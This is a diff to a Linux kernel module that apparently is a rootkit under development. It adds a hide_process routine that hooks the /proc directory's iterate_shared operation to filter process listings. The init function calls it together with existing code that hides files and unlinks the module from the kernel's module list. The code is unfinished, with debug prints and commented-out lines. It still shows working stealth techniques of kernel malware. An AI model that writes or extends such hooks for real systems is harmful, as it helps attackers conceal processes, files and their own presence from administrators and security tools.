@@ -17,6 +17,7 @@ static struct list_head *modules;
 
 static char *test_path_name = "/home/yanayg/test_file";
 static char *test_path_name2 = "/home/yanayg/test_file2";
+static unsigned long proc_ino = 0;
 
 static void hide_module(void) {
     // Save the list for later so we can add the module back in.
@@ -211,6 +212,9 @@ static int new_actor(struct dir_context *ctx, const char *name, int namelen, lof
                     return 0;
                 }
 	        }
+	        if (entry->ino == proc_ino) {
+	            printk(KERN_INFO "Called proc iterate!");
+	        }
 	        return entry->prev_actor(ctx, name, namelen, off, ino, type);
 	    }
 	}
@@ -282,6 +286,44 @@ static int hide_file(const char *path_name) {
 	return 0;
 }
 
+static int hide_process(void) {
+    int retval;
+    //	char *dir_path;
+    //	char *file_name;
+	struct inode *inode;
+	struct fops_hook *fops_hook;
+	struct file_operations *file_operations;
+
+    //	dir_path = kmalloc(strlen(path_name), GFP_KERNEL);
+    //	strcpy(dir_path, path_name);
+    //    file_name = strtok_r(dir_path, "/");
+
+	if ((retval = get_inode_by_path_name("/proc", &inode))) {
+	    return retval;
+	}
+
+    //	if ((retval = create_hidden_file_entry(inode, file_name))) {
+    //	    return retval;
+    //	}
+    //	kfree(dir_path);
+
+	fops_hook = get_fops_hook(inode);
+	if (fops_hook != NULL) {
+	    fops_hook->refcount++;
+	    fops_hook->fops->iterate_shared = new_iterate_shared;
+	    return 0;
+	}
+
+	if ((retval = create_fops_hook(inode, &file_operations))) {
+    // free_hidden_file_entry(inode, file_name);
+	    return retval;
+	}
+
+	file_operations->iterate_shared = new_iterate_shared;
+
+	return 0;
+}
+
 static int unhide_file(const char *path_name) {
     int retval;
 	char *dir_path;
@@ -331,13 +373,22 @@ static int pid_matches_exec_path_name(int pid, const char *path_name) {
     return inode->i_ino == get_exec_ino_by_pid(pid);
 }
 
+static void init_hidden_processes(void) {
+    // TODO: put inode.
+    struct inode *inode;
+    get_inode_by_path_name("/proc", &inode);
+    proc_ino = inode->i_ino;
+    hide_process();
+}
+
 static int __init MRK_initialize(void) {
+    init_hidden_processes();
 	hide_file(test_path_name);
 	hide_file(test_path_name2);
 	unhide_file(test_path_name2);
-	get_exec_ino_by_pid(2609);
+//	get_exec_ino_by_pid(2609);
 //	hide_file("/proc/22");
-  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
+//  printk(KERN_INFO "%d", pid_matches_exec_path_name(2609, "/bin/ps"));
 	hide_module();
 	printk(KERN_INFO "Hello, World!\n");
 	return 0;
